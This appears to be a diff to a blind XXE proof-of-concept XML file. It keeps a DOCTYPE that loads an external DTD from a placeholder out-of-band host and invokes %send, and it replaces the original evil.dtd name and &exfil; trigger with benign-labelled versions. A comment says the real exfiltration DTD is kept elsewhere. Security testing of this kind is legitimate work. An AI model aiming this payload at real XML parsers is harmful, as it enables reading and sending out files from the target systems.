@@ -19,11 +19,11 @@
   The REAL exfil DTD body (authorized only) is included in the .dtd comments.
 -->
 <!DOCTYPE poc [
-  <!ENTITY % dtd SYSTEM "http://xxe1.YOUR-OOB-HOST.example.invalid/evil.dtd">
+  <!ENTITY % dtd SYSTEM "http://xxe1.YOUR-OOB-HOST.example.invalid/xxe_oob_beacon.dtd">
   %dtd;
   %send;
 ]>
 <poc>
   <title>Benign blind-XXE OOB PoC</title>
-  <trigger>&exfil;</trigger>
+  <trigger>benign-proof-text</trigger>
 </poc>
